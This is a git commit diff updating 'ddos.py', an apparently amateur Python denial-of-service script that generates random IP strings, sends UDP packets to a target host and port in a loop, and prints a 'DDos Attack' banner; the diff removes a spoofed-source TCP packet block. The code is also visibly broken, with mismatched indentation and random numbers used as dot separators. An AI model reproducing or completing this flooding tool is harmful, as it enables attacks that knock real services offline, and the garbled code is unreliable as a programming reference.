3abcde69f2be2d8aeb0be97270cb591e5237b368
Fabri15544 <51274314+Fabri15544@users.noreply.github.com>
2020-01-17 22:02:31 -0300

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -17,12 +17,7 @@ while True:
    c = str(random.randint(1,254))
    d = str(random.randint(1,254))
    dot = str(random.randint(1,254))
-   Source_ip = a + dot + b + dot + c + dot + d
-  
-      IP1 = IP(source_IP = source_IP, destination = target_IP)
-      TCP1 = TCP(srcport = source_port, dstport = 80)
-      pkt = IP1 / TCP1
-      send(pkt,inter = .999)
+   target_host = a + dot + b + dot + c + dot + d
       
 #packet
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -31,7 +26,7 @@ sock.sendto(bytes, (target_host, target_port))
 os.system("clear")
 os.system("figlet DDos Attack")
 #conexion_client
-sent = 1
+sent = 999
 pysendfile = 0
 while True:
 
